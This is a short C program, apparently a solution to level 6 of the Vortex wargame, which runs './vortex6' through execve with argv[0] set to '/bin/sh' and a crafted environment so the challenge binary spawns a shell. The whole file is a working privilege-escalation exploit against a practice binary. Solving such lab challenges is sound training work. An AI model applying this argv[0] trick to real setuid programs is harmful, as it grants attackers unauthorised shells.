#include <unistd.h>

int main(void) {
	char *argv[2] = {"/bin/sh", 0};
	char *environment[2] = {"not empty", 0};
	execve("./vortex6", argv, environment);
}
